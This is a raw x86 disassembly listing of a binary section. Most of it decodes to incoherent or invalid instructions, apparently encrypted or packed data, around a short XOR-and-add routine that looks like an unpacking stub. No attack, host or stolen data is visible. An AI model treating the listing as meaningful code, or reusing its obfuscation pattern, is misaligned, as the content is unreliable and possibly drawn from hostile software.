  40cc82:	call   0x38ff:0xebdbd972
  40cc89:	add    eax,0xfdc97a9c
  40cc8e:	mov    dh,0xaa
  40cc90:	iret   
  40cc91:	jo     0x40cc1e
  40cc93:	pop    ebp
  40cc94:	jae    0x48ff
  40cc99:	push   ebx
  40cc9a:	mov    edx,0x27811bd9
  40cc9f:	ja     0x40ccc3
  40cca1:	add    bh,dl
  40cca3:	hlt    
  40cca4:	adc    DWORD PTR [esi],0x8
  40cca7:	or     ecx,ebx
  40cca9:	cld    
  40ccaa:	je     0x40ccaa
  40ccac:	out    0x58,al
  40ccae:	(bad)  [ecx]
  40ccb0:	xchg   esp,eax
  40ccb1:	mov    eax,ds:0xf963e3a5
  40ccb6:	and    bh,BYTE PTR [edx]
  40ccb8:	retf   0x95a9
  40ccbb:	sbb    BYTE PTR [ecx-0x25],ah
  40ccbe:	or     al,0x15
  40ccc0:	and    DWORD PTR [edx-0x61],0x294d3a7a
  40ccc7:	scas   al,BYTE PTR es:[edi]
  40ccc8:	imul   DWORD PTR [esi]
  40ccca:	mov    WORD PTR [edx-0x58],cs
  40cccd:	add    bl,BYTE PTR [esi]
  40cccf:	push   0x7a
  40ccd1:	dec    ebx
  40ccd2:	cmp    al,0x4f
  40ccd4:	addr16 std 
  40ccd6:	cld    
  40ccd7:	sar    BYTE PTR [esi+ebx*8],0x8d
  40ccdb:	xor    esp,DWORD PTR [eax-0x1e]
  40ccde:	js     0x40ccd6
  40cce0:	jl     0x40cd31
  40cce2:	adc    esp,ebx
  40cce4:	(bad)
  40cce9:	mov    ds:0x238ac556,al
  40ccee:	into   
  40ccef:	xchg   esp,eax
  40ccf0:	sub    al,ch
  40ccf2:	and    al,0xb
  40ccf4:	(bad)  
  40ccf5:	lahf   
  40ccf6:	outs   dx,DWORD PTR ds:[esi]
  40ccf7:	in     al,dx
  40ccf8:	ror    DWORD PTR [ecx-0x39],0xb8
  40ccfc:	lods   al,BYTE PTR ds:[esi]
  40ccfd:	lods   eax,DWORD PTR ds:[esi]
  40ccfe:	pop    edi
  40ccff:	mov    ds:0x83cbe1c7,al
  40cd04:	and    dh,BYTE PTR [edi-0x32]
  40cd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd08:	je     0x40cc93
  40cd0a:	mov    ds:0x14acd64f,al
  40cd0f:	out    0x2f,al
  40cd11:	pop    edx
  40cd12:	imul   ebx,ecx,0xffffffb9
  40cd15:	shl    BYTE PTR [ecx-0x74b6c7ab],0xb
  40cd1c:	push   ss
  40cd1d:	retf   
  40cd1e:	push   ebx
  40cd1f:	pop    cx
  40cd21:	sbb    eax,0x3a53efd1
  40cd26:	push   DWORD PTR [ecx+eax*2-0x2]
  40cd2a:	call   0xfcab:0x34a28de8
  40cd31:	cmp    DWORD PTR [edx+0x39],edi
  40cd34:	add    DWORD PTR [ecx],0xd13b156a
  40cd3a:	call   0x8a84827
  40cd3f:	aad    0x8a
  40cd41:	push   edx
  40cd42:	dec    esp
  40cd43:	sbb    dh,dl
  40cd45:	call   0x7788f88a
  40cd4a:	sar    ah,cl
  40cd4c:	cmp    al,0x1
  40cd4e:	mov    bh,BYTE PTR [esi]
  40cd50:	jno    0x40cd6a
  40cd52:	mov    ax,0x2482
  40cd56:	xor    BYTE PTR [edi+esi*1-0x7f02ce15],dh
  40cd5d:	sub    ebp,DWORD PTR [ebp+0x16]
  40cd60:	imul   esp,DWORD PTR [edi+edx*8+0x16],0xffffff94
  40cd65:	shl    ah,1
  40cd67:	dec    ecx
  40cd68:	mov    al,ds:0x2c15cf77
  40cd6d:	das    
  40cd6e:	or     cl,ch
  40cd70:	not    BYTE PTR [ebp+0x1a]
  40cd73:	cbw    
  40cd75:	lods   eax,DWORD PTR ds:[esi]
  40cd76:	std    
  40cd77:	jmp    DWORD PTR [ebp-0x66df76a5]
  40cd7d:	mov    bl,0x3e
  40cd7f:	jno    0x40cd66
  40cd81:	jns    0x40cd83
  40cd83:	mov    ah,BYTE PTR [eax-0x5db5f2ee]
  40cd89:	in     eax,0x97
  40cd8b:	shr    edx,1
  40cd8d:	iret   
  40cd8e:	sbb    eax,0x2b9a0708
  40cd93:	mov    ch,0xc
  40cd95:	das    
  40cd96:	xchg   ebp,eax
  40cd97:	pop    ds
  40cd98:	icebp  
  40cd99:	mov    bh,0xff
  40cd9b:	js     0x40cdc5
  40cd9d:	lds    edi,FWORD PTR [edi-0x72e8a16d]
  40cda3:	inc    ecx
  40cda4:	mov    bh,BYTE PTR [edx-0x75]
  40cda7:	mov    DWORD PTR [ecx+0x37],edx
  40cdaa:	ja     0x40cd89
  40cdac:	and    DWORD PTR [edx-0x9],ebx
  40cdaf:	shl    BYTE PTR [ecx+0x27e622da],1
  40cdb5:	daa    
  40cdb6:	mov    edx,es
  40cdb8:	xchg   ebp,eax
  40cdb9:	ins    DWORD PTR es:[edi],dx
  40cdba:	pop    esp
  40cdbb:	test   ebx,esp
  40cdbd:	icebp  
  40cdbe:	sub    ch,cl
  40cdc0:	addr16 push 0x4017aa3
  40cdc6:	scas   eax,DWORD PTR es:[edi]
  40cdc7:	inc    ebp
  40cdc8:	mov    esp,0x62aaed8b
  40cdcd:	ror    BYTE PTR [eax-0x15],0x4f
  40cdd1:	call   0x2c4c709e
  40cdd6:	ja     0x40cd81
  40cdd8:	je     0x40ce1a
  40cdda:	ins    BYTE PTR es:[edi],dx
  40cddb:	lds    ecx,FWORD PTR [eax+0x45]
  40cdde:	push   ebx
  40cddf:	rol    ecx,0x94
  40cde2:	jns    0x40cde4
  40cde4:	cs (bad) 
  40cde6:	pop    eax
  40cde7:	pop    ds
  40cde8:	stc    
  40cde9:	cwde   
  40cdea:	dec    edx
  40cdeb:	pop    edx
  40cdec:	push   edi
  40cded:	js     0x40cdae
  40cdef:	inc    esp
  40cdf0:	and    eax,0x64d1e907
  40cdf5:	add    al,al
  40cdf7:	pushaw 
  40cdf9:	dec    esi
  40cdfa:	push   0x1bd098ad
  40cdff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce00:	(bad)  
  40ce01:	mov    ebx,0x9fac863d
  40ce06:	out    dx,eax
  40ce07:	in     eax,dx
  40ce08:	mov    eax,0xe3b39de5
  40ce0d:	je     0x40ce30
  40ce0f:	in     al,dx
  40ce10:	pop    eax
  40ce11:	xor    edi,DWORD PTR [ebx-0x3f4650d7]
  40ce17:	or     bl,dl
  40ce19:	fimul  WORD PTR [ecx+0x61]
  40ce1c:	jle    0x40ce51
  40ce1e:	(bad)  
  40ce1f:	xchg   edx,eax
  40ce20:	ud2    
  40ce22:	sub    esi,DWORD PTR [eax-0x508208a3]
  40ce28:	fsub   QWORD PTR ds:0x2926c6bf
  40ce2e:	icebp  
  40ce2f:	mov    esi,0x9ae74378
  40ce34:	lods   al,BYTE PTR ds:[esi]
  40ce35:	lahf   
  40ce36:	jp     0x40cde5
  40ce38:	sub    al,0xcd
  40ce3a:	outs   dx,DWORD PTR ds:[esi]
  40ce3b:	daa    
  40ce3c:	add    BYTE PTR [ecx+ecx*8-0x70],bh
  40ce40:	or     eax,0xd7cdfacc
  40ce45:	dec    esi
  40ce46:	inc    ebx
  40ce47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce48:	cmp    edi,DWORD PTR ds:0x7e762e0e
  40ce4e:	imul   edi,DWORD PTR [edi+eax*8-0x59],0xffffff8e
  40ce53:	pop    esp
  40ce54:	retf   
  40ce55:	jo     0x40ce1d
  40ce57:	retf   0x3e1d
  40ce5a:	sbb    DWORD PTR [ebp+edi*1+0x75e2954e],eax
  40ce61:	or     eax,0x8c565d10
  40ce66:	jno    0x40ce98
  40ce68:	(bad)  [edx-0x65722251]
  40ce6e:	addr16 retf 0x6298
  40ce72:	das    
  40ce73:	and    bh,dh
  40ce75:	(bad)  
  40ce76:	mov    edi,0x7e79030
  40ce7b:	retf   0xf5ad
  40ce7e:	cs mov ch,0x40
  40ce81:	retf   0x2440
  40ce84:	fadd   QWORD PTR [eax+0x57b2ef7]
  40ce8a:	loope  0x40cefd
  40ce8c:	dec    edx
  40ce8d:	mov    bh,0x2a
  40ce8f:	int3   
  40ce90:	cmc    
  40ce91:	retf   0x3626
  40ce94:	int3   
  40ce95:	dec    esp
  40ce96:	jle    0x40cf09
  40ce98:	inc    edi
  40ce99:	push   edi
  40ce9b:	cmp    esp,DWORD PTR [eax-0x4f98dac5]
  40cea1:	in     al,0x64
  40cea3:	mov    dl,al
  40cea5:	mov    ds:0xec785c0e,al
  40ceaa:	lea    esp,[ebp+ecx*4-0x35]
  40ceae:	fld    QWORD PTR [esi-0x32]
  40ceb1:	mov    al,ds:0x4c07dc2
  40ceb6:	int    0x60
  40ceb8:	dec    eax
  40ceb9:	push   esp
  40ceba:	xchg   esi,edi
  40cebc:	inc    ebx
  40cebd:	xchg   esp,eax
  40cebe:	jns    0x40ce7d
  40cec0:	push   esp
  40cec1:	cmovne esp,DWORD PTR [edx+0x7cd957a4]
  40cec8:	jnp    0x40cec7
  40ceca:	outs   dx,BYTE PTR ds:[esi]
  40cecb:	and    BYTE PTR [edi+ecx*2-0x64],bh
  40cecf:	lahf   
  40ced0:	pop    esi
  40ced1:	(bad)  
  40ced3:	push   ebx
  40ced4:	and    esi,DWORD PTR [ecx-0x5c]
  40ced7:	outs   dx,DWORD PTR fs:[esi]
  40ced9:	push   ebp
  40ceda:	mov    bl,0xb1
  40cedc:	ds ret 
  40cede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cedf:	adc    al,al
  40cee1:	retf   
  40cee2:	adc    ecx,edx
  40cee4:	push   0x1b
  40cee6:	xchg   edx,eax
  40cee7:	in     eax,0x92
  40cee9:	int    0x3d
  40ceeb:	add    al,0x2
  40ceed:	fwait
  40ceee:	je     0x40cebb
  40cef0:	cmp    edx,DWORD PTR [edx]
  40cef2:	dec    edi
  40cef3:	imul   esp,DWORD PTR ds:0x5cbb4551,0xffffff8d
  40cefa:	in     eax,0x5e
  40cefc:	call   0x7fc4530
  40cf01:	mov    WORD PTR [edi],cs
  40cf03:	xchg   BYTE PTR [ebp+0x40017618],dl
  40cf09:	jge    0x40cf69
  40cf0b:	lods   al,BYTE PTR ds:[esi]
  40cf0c:	lahf   
  40cf0d:	mov    esp,0x3b4995d6
  40cf12:	pop    ecx
  40cf13:	and    edx,edx
  40cf15:	and    al,0xcc
  40cf17:	mov    ds:0x32670a67,al
  40cf1c:	xor    edi,DWORD PTR [edi+0x5c]
  40cf1f:	aaa    
  40cf20:	xor    al,0x78
  40cf22:	sahf   
  40cf23:	pop    esp
  40cf24:	inc    eax
  40cf25:	ret    0x7b01
  40cf28:	add    BYTE PTR [ebp+0xb],bh
  40cf2b:	jno    0x40ceb5
  40cf2d:	ret    
  40cf2e:	fldlg2 
  40cf30:	rcl    DWORD PTR [eax+0x78],0x41
  40cf34:	jne    0x40cef8
  40cf36:	cmp    DWORD PTR [eax+0x53],eax
  40cf39:	je     0x40cf97
  40cf3b:	mov    WORD PTR [edx+0x2daed4b5],es
  40cf41:	call   0x5afeb1a6
  40cf46:	int    0x4b
  40cf48:	shl    DWORD PTR [edi+0x7c091b3],0x46
  40cf4f:	and    BYTE PTR [ecx+0x30c458b],al
  40cf55:	inc    ebp
  40cf56:	or     BYTE PTR [ecx+0x458bf045],cl
  40cf5c:	in     al,0x85
  40cf5e:	ror    BYTE PTR [edi],0x84
  40cf61:	push   0x10
  40cf63:	add    BYTE PTR [eax],al
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x70
  40cf80:	aaa    
  40cf81:	nop
  40cf82:	fisub  WORD PTR [ecx]
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	stos   DWORD PTR es:[edi],eax
  40cf8c:	add    eax,DWORD PTR [ecx-0x5c]
  40cf8f:	dec    esp
  40cf90:	xchg   esi,eax
  40cf91:	and    al,BYTE PTR [ecx]
  40cf93:	test   eax,0xaf0700f5
  40cf98:	mov    edx,0x3dd42785
  40cf9d:	retf   0x5d8b
  40cfa0:	push   cs
  40cfa1:	stc    
  40cfa2:	push   esp
  40cfa3:	push   0x4ed2b536
  40cfa8:	xlat   BYTE PTR ds:[ebx]
  40cfa9:	xchg   esi,eax
  40cfaa:	jae    0x40cfbc
  40cfac:	xor    DWORD PTR [edx+0x1691f060],esi
  40cfb2:	gs cli 
  40cfb4:	mov    cl,ch
  40cfb6:	jnp    0x40cf57
  40cfb8:	loop   0x40d009
  40cfba:	or     al,0x36
  40cfbc:	jb     0x40cfd4
  40cfbe:	pop    es
  40cfbf:	retf   
  40cfc0:	pop    esp
  40cfc1:	sub    al,0xfe
  40cfc3:	hlt    
  40cfc4:	jns    0x40cf52
  40cfc6:	adc    bl,BYTE PTR [ecx]
  40cfc8:	mov    edi,0xf22a4e9b
  40cfcd:	inc    esp
  40cfce:	sbb    eax,0x8ebed526
  40cfd3:	stos   BYTE PTR es:[edi],al
  40cfd4:	(bad)  
  40cfd5:	dec    ecx
  40cfd6:	lock sub BYTE PTR [ebx],bh
  40cfd9:	aaa    
  40cfda:	push   es
  40cfdb:	and    BYTE PTR [edi+esi*4+0x60],dl
  40cfdf:	pop    ds
  40cfe0:	or     esp,DWORD PTR [edi]
  40cfe2:	cwde   
  40cfe3:	lods   al,BYTE PTR ds:[esi]
  40cfe4:	lods   al,BYTE PTR ds:[esi]
  40cfe5:	xor    al,BYTE PTR [ecx+0x28]
  40cfe8:	popa   
  40cfe9:	enter  0x10ff,0xd7
  40cfed:	cmp    eax,0xd1feb9cd
  40cff2:	inc    edx
  40cff3:	call   0x8e0bc72d
  40cff8:	cmp    DWORD PTR [ecx+0x36],ecx
  40cffb:	xchg   ebp,eax
  40cffd:	test   DWORD PTR [esi-0x23],0x7536e841
  40d004:	fldlg2 
  40d006:	je     0x40d024
  40d008:	std    
  40d009:	push   0x37e581c5
  40d00e:	adc    ebp,DWORD PTR [eax]
  40d010:	icebp  
  40d011:	hlt    
  40d012:	test   DWORD PTR [ebp+0x6767ceb9],eax
  40d018:	inc    eax
  40d019:	into   
  40d01a:	and    eax,0xfa293c39
  40d01f:	bound  esp,QWORD PTR [esi-0x53]
  40d022:	mov    ch,0xd8
  40d024:	fwait
  40d025:	mov    bl,BYTE PTR ds:0x5ad1d55f
  40d02b:	adc    ebp,ebx
  40d02d:	sub    al,0x61
  40d02f:	or     bl,BYTE PTR [eax+0x263601fa]
  40d035:	(bad)  
  40d036:	cmp    esi,eax
  40d038:	jae    0x40d094
  40d03a:	nop
  40d03b:	mov    edi,0x7bfb8dec
  40d040:	fcmovnb st,st(0)
  40d042:	push   ss
  40d043:	lock pop ebx
  40d045:	xchg   BYTE PTR [esi],al
  40d047:	push   eax
  40d048:	je     0x40d0a5
  40d04a:	xor    al,0x9e
  40d04c:	in     al,0xba
  40d04e:	add    al,0xf1
  40d050:	cli    
  40d051:	inc    esp
  40d052:	pop    es
  40d053:	fs mov bl,0xca
  40d056:	(bad)  [ebp+ebp*8-0x9223ff]
  40d05d:	leave  
  40d05e:	sub    al,0x69
  40d060:	sbb    eax,0xe91bcbf2
  40d065:	push   0x2efb9b6d
  40d06a:	int    0xb7
  40d06c:	ror    BYTE PTR [ecx],1
  40d06e:	push   esp
  40d06f:	pop    ebp
  40d070:	(bad)  
  40d072:	pushf  
  40d073:	xor    eax,DWORD PTR [edx-0x2772860]
  40d079:	scas   al,BYTE PTR es:[edi]
  40d07a:	mov    ds:0xd9f3fd3,al
  40d07f:	add    DWORD PTR [ebx],ecx
  40d081:	xchg   esi,eax
  40d082:	or     DWORD PTR [esi+0x2039699c],0x28
  40d089:	das    
  40d08a:	(bad)  
  40d08b:	in     al,dx
  40d08c:	xchg   ebx,eax
  40d08d:	mov    al,ds:0x2f0dc252
  40d092:	push   edx
  40d093:	(bad)  
  40d094:	retf   0x6a66
  40d097:	scas   eax,DWORD PTR es:[edi]
  40d098:	ror    DWORD PTR [eax+eiz*4],cl
  40d09b:	mov    ds:0xaad31d15,al
  40d0a0:	popa   
  40d0a1:	mov    ebp,0xcca7d0ee
  40d0a6:	push   ebx
  40d0a7:	push   esp
  40d0a8:	das    
  40d0a9:	mov    dh,BYTE PTR [eax]
  40d0ab:	inc    ecx
  40d0ac:	lock pop ds
  40d0ae:	lahf   
  40d0af:	push   0x26277f6d
  40d0b4:	stos   DWORD PTR es:[edi],eax
  40d0b5:	loop   0x40d0a9
  40d0b7:	in     al,dx
  40d0b8:	xor    dl,BYTE PTR [edx-0x4171b630]
  40d0be:	mov    edi,ebx
  40d0c0:	jmp    0x4c78f4e5
  40d0c5:	push   ds
  40d0c6:	and    eax,0xb32b5db
  40d0cb:	scas   eax,DWORD PTR es:[edi]
  40d0cc:	cmp    eax,0xb64d367c
  40d0d1:	inc    esi
  40d0d2:	inc    eax
  40d0d3:	inc    ecx
  40d0d4:	cli    
  40d0d5:	cmp    ebx,DWORD PTR [edi+0x2229c083]
  40d0db:	add    eax,0x4ae2a131
  40d0e0:	leave  
  40d0e1:	sbb    al,BYTE PTR [ecx-0x37]
  40d0e4:	push   edx
  40d0e5:	sub    bl,dh
  40d0e7:	iret   
  40d0e8:	push   0xfffffff9
  40d0ea:	and    eax,0x8453b506
  40d0ef:	push   esp
  40d0f0:	pop    esp
  40d0f1:	repnz sub eax,0x731f4bc0
  40d0f7:	pop    ecx
  40d0f8:	neg    ecx
  40d0fa:	jo     0x40d154
  40d0fc:	and    DWORD PTR [edx],0xffffffc5
  40d0ff:	xor    al,0x82
  40d101:	in     eax,dx
  40d102:	mov    bl,0x3d
  40d104:	cmp    al,0x4e
  40d106:	dec    ebx
  40d107:	popf   
  40d108:	(bad)  
  40d109:	test   al,0xc2
  40d10b:	dec    ecx
  40d10c:	sbb    esp,DWORD PTR [ebx]
  40d10e:	inc    ebp
  40d10f:	sti    
  40d110:	jmp    DWORD PTR [ebp*4+0x640eecd5]
  40d117:	xor    BYTE PTR [esi],dl
  40d119:	sub    eax,0x8cba7891
  40d11e:	leave  
  40d11f:	imul   esi,DWORD PTR [edi],0xffffffac
  40d122:	sub    eax,0x9822dbd8
  40d127:	jb     0x40d12d
  40d129:	xchg   edi,eax
  40d12a:	(bad)  
  40d12b:	data16 cmp BYTE PTR [ebp+0x50],cl
  40d12f:	ds adc al,0xcc
  40d132:	cmovo  esi,DWORD PTR [edx-0x1]
  40d136:	fcomp  DWORD PTR [edx+0x380dbd92]
  40d13c:	call   0xa781:0x7ccf00d7
  40d143:	xor    BYTE PTR [esi+ecx*4],ah
  40d146:	outs   dx,DWORD PTR ds:[esi]
  40d147:	(bad)  
  40d149:	popa   
  40d14a:	fstp   QWORD PTR [edx+0x3bb0bde6]
  40d150:	sub    al,0xa7
  40d152:	fadd   QWORD PTR [ebp+0x1e]
  40d155:	cli    
  40d156:	mov    ecx,0x6ec2077b
  40d15b:	call   0x9fea5557
  40d160:	xor    eax,0xf3e54d1e
  40d165:	xchg   edx,eax
  40d166:	xchg   ecx,eax
  40d167:	or     DWORD PTR ds:0x81c71a11,eax
  40d16d:	rcl    BYTE PTR [esi],cl
  40d16f:	dec    ecx
  40d170:	js     0x40d16b
  40d172:	push   eax
  40d173:	aam    0xa3
  40d175:	cmp    cl,BYTE PTR [edx+0x74]
  40d178:	pop    ebp
  40d179:	sub    ecx,DWORD PTR [edi+esi*1+0x2b]
  40d17d:	mov    ss,WORD PTR [esi-0x814d594]
  40d183:	xchg   esp,eax
  40d184:	xchg   BYTE PTR [ebx-0xe6074a4],bl
  40d18a:	int3   
  40d18b:	stos   DWORD PTR es:[edi],eax
  40d18c:	push   ss
  40d18d:	dec    ecx
  40d18e:	mov    esi,0xddcdd68a
  40d193:	push   es
  40d194:	int    0x50
  40d196:	or     al,0x71
  40d199:	jl     0x40d182
  40d19b:	cmp    eax,0xa0f2b2bb
  40d1a0:	pop    ss
  40d1a1:	mov    edi,0x3b249f56
  40d1a6:	xor    DWORD PTR [ebx+edi*2-0x4e22f98a],edi
  40d1ad:	dec    edi
  40d1ae:	xor    eax,0x9dee0142
  40d1b3:	add    eax,0x61c84d51
  40d1b8:	test   DWORD PTR ds:0x23a6ea58,ebx
  40d1be:	fld    DWORD PTR [ebx]
  40d1c0:	lahf   
  40d1c1:	pcmpgtd mm6,QWORD PTR [esi]
  40d1c4:	push   edi
  40d1c5:	enter  0x4e5,0x6a
  40d1c9:	repz les ecx,FWORD PTR [edi]
  40d1cc:	das    
  40d1cd:	sti    
  40d1ce:	arpl   WORD PTR [edx],bx
  40d1d0:	mov    ebp,0x40450e00
  40d1d5:	idiv   ecx
  40d1d7:	daa    
  40d1d8:	jae    0x40d204
  40d1da:	retf   0xea12
  40d1dd:	out    0x90,al
  40d1df:	pop    ecx
  40d1e0:	lea    ebx,[eax-0x6b]
  40d1e3:	ja     0x40d231
  40d1e5:	(bad)  
  40d1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e7:	cmp    ch,BYTE PTR [esi+0x1f]
  40d1ea:	add    al,0xc1
  40d1ec:	add    dh,BYTE PTR [esi+edx*2-0x72]
  40d1f0:	mov    dl,0x9c
  40d1f2:	sar    DWORD PTR [ecx+0x1c],1
  40d1f5:	popa   
  40d1f6:	jge    0x40d23d
  40d1f8:	dec    eax
  40d1f9:	or     DWORD PTR [ecx],esp
  40d1fb:	rcr    DWORD PTR [edi],cl
  40d1fd:	mov    ah,0x9d
  40d1ff:	into   
  40d200:	int    0x80
  40d202:	ins    DWORD PTR es:[edi],dx
  40d203:	ja     0x40d215
  40d205:	inc    ecx
  40d206:	retf   0xbbce
  40d209:	sbb    BYTE PTR [edx+0x5d477d5d],0x11
  40d210:	xor    cl,BYTE PTR ds:0x9c28d344
  40d216:	sub    BYTE PTR [esi-0x6ea4fd3f],bh
  40d21c:	inc    ebp
  40d21d:	inc    ebx
  40d21e:	loopne 0x40d1cc
  40d220:	(bad)  
  40d221:	cmc    
  40d222:	and    eax,0x6f23f23b
  40d227:	scas   eax,DWORD PTR es:[edi]
  40d228:	not    BYTE PTR [esi]
  40d22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d22b:	cwde   
  40d22c:	and    DWORD PTR [eax-0x72a65d52],esp
  40d232:	adc    BYTE PTR ds:0xe1f8c038,ch
  40d238:	gs loope 0x40d27c
  40d23b:	fsubr  st(3),st
  40d23d:	ret    0x8627
  40d240:	adc    eax,0xc4c3e519
  40d245:	cmp    al,0x25
  40d247:	cmp    DWORD PTR [edi],esi
  40d249:	loop   0x40d1f1
  40d24b:	ds fcmovnu st,st(3)
  40d24e:	xchg   ebp,eax
  40d24f:	sub    ecx,edi
  40d251:	stos   DWORD PTR es:[edi],eax
  40d252:	push   ecx
  40d253:	xchg   ebx,eax
  40d254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d255:	ds pop es
  40d257:	inc    eax
  40d258:	fdiv   QWORD PTR [ebp-0x7737a7de]
  40d25e:	and    DWORD PTR [ebp+0x4d],0x2e
  40d262:	rep stos DWORD PTR es:[edi],eax
  40d264:	scas   al,BYTE PTR es:[edi]
  40d265:	xchg   ebp,eax
  40d266:	xchg   BYTE PTR [eax+edx*8],cl
  40d269:	xchg   edi,eax
  40d26a:	repnz in eax,0x78
  40d26d:	jmp    0x40d2a7
  40d26f:	mov    BYTE PTR ds:0xd7fcd431,dl
  40d275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d276:	lods   eax,DWORD PTR ds:[esi]
  40d277:	xchg   edi,eax
  40d278:	neg    DWORD PTR [edx]
  40d27a:	mov    al,0x8a
  40d27c:	mov    ah,0xa8
  40d27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d27f:	cdq    
  40d280:	or     al,0xca
  40d282:	mov    ecx,0xfc6e549b
  40d287:	push   ss
  40d288:	dec    edi
  40d289:	xchg   DWORD PTR ds:0x5b13c20d,ecx
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	inc    esi
  40d2d1:	push   edx
  40d2d2:	xchg   ebx,eax
  40d2d3:	loope  0x40d301
  40d2d5:	xchg   ebp,eax
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	ror    al,1
  40d2de:	jmp    0x920a:0xa45835c6
  40d2e5:	adc    ebp,ebx
  40d2e7:	lahf   
  40d2e8:	loopne 0x40d2ac
  40d2ea:	cmc    
  40d2eb:	fnsave [esi-0x2c]
  40d2ee:	push   es
  40d2ef:	sub    ah,BYTE PTR [eax]
  40d2f1:	(bad)
  40d2f5:	int3   
  40d2f6:	xor    ch,BYTE PTR [edx+0x6c]
  40d2f9:	mov    esp,0x7f1d6b92
  40d2fe:	clc    
  40d2ff:	mov    bl,0xf9
  40d301:	fs mov bh,al
  40d304:	stos   DWORD PTR es:[edi],eax
  40d305:	or     al,0xbc
  40d307:	dec    ebx
  40d308:	dec    ebx
  40d309:	imul   edi,DWORD PTR [ecx+0x4651d02f],0x8e36a37f
  40d313:	stc    
  40d314:	jns    0x40d339
  40d316:	fwait
  40d317:	(bad)  
  40d318:	lods   al,BYTE PTR ds:[esi]
  40d319:	sub    ebx,DWORD PTR [ecx+0x24]
  40d31c:	sub    al,0xf5
  40d31e:	dec    edi
  40d31f:	and    cl,BYTE PTR [ebx]
  40d321:	sbb    esp,DWORD PTR [ecx+0x6d4a12ac]
  40d327:	loopne 0x40d388
  40d329:	lahf   
  40d32a:	and    BYTE PTR [edx],bl
  40d32c:	inc    ecx
  40d32d:	ins    DWORD PTR es:[edi],dx
  40d32e:	xchg   ebp,eax
  40d32f:	lock xchg cx,ax
  40d332:	pushf  
  40d333:	cmc    
  40d334:	and    BYTE PTR [eax],0x6c
  40d337:	pop    ebp
  40d338:	mov    edx,0x51f7cc9a
  40d33d:	or     eax,0xbd9df094
  40d342:	fmul   DWORD PTR [eax]
  40d344:	mov    al,ds:0x85962e7e
  40d349:	xchg   edi,eax
  40d34a:	mov    bh,0x17
  40d34c:	out    0x6f,eax
  40d34e:	inc    edx
  40d34f:	fs xchg edi,eax
  40d351:	sbb    DWORD PTR cs:[edi-0x53],edx
  40d355:	je     0x40d310
  40d357:	(bad)  
  40d358:	fistp  WORD PTR [edx+0x402bdbc7]
  40d35e:	es push edi
  40d360:	repz jp 0x40d392
  40d363:	push   esi
  40d364:	test   ebx,edi
  40d366:	out    dx,eax
  40d367:	sub    DWORD PTR [ebp+0x4b],ebp
  40d36a:	cdq    
  40d36b:	adc    BYTE PTR [edx-0x23],cl
  40d36e:	pop    sp
  40d370:	addr16 xchg ecx,eax
  40d372:	jmp    0x818eea9a
  40d377:	and    eax,0x9e19edd9
  40d37c:	push   0x55
  40d37e:	shr    BYTE PTR [esi-0x266886ea],0xe8
  40d385:	jno    0x40d30e
  40d387:	cmp    al,0x1c
  40d389:	sub    al,0xd4
  40d38b:	adc    al,BYTE PTR [ecx-0x26]
  40d38e:	and    eax,DWORD PTR [eax-0x1]
  40d391:	adc    dh,bh
  40d393:	shl    BYTE PTR [edx-0x17],1
  40d396:	lea    ebp,[ebx+0x6b57cfec]
  40d39c:	jecxz  0x40d408
  40d39e:	xchg   ecx,eax
  40d39f:	shl    BYTE PTR [ebp-0x4161a595],cl
  40d3a5:	xor    esp,DWORD PTR [eax+0x48]
  40d3a8:	mov    ds:0x56f5881e,eax
  40d3ad:	test   ebp,ecx
  40d3af:	sub    edx,DWORD PTR [ebp+0x7]
  40d3b2:	aam    0x2c
  40d3b4:	push   cs
  40d3b5:	mov    bh,0x71
  40d3b7:	push   edx
  40d3b8:	mov    ch,BYTE PTR [ebx-0x28eb2bf]
  40d3be:	xchg   esi,eax
  40d3bf:	(bad)  
  40d3c0:	jno    0x40d3ac
  40d3c2:	loop   0x40d416
  40d3c4:	sbb    DWORD PTR [esi+eiz*4],edi
  40d3c7:	fs jge 0x40d3a1
  40d3ca:	inc    esp
  40d3cb:	jmp    0x9d252187
  40d3d0:	add    eax,0xc3cc951b
  40d3d5:	xchg   edx,eax
  40d3d6:	pop    ecx
  40d3d7:	pop    eax
  40d3d8:	push   ss
  40d3d9:	push   ebp
  40d3da:	xchg   edi,eax
  40d3db:	mov    eax,0x210e6ecb
  40d3e0:	cmp    dl,BYTE PTR [eax+eiz*1+0x52]
  40d3e4:	ds sub eax,0x70a7296
  40d3ea:	push   cs
  40d3eb:	xchg   edi,eax
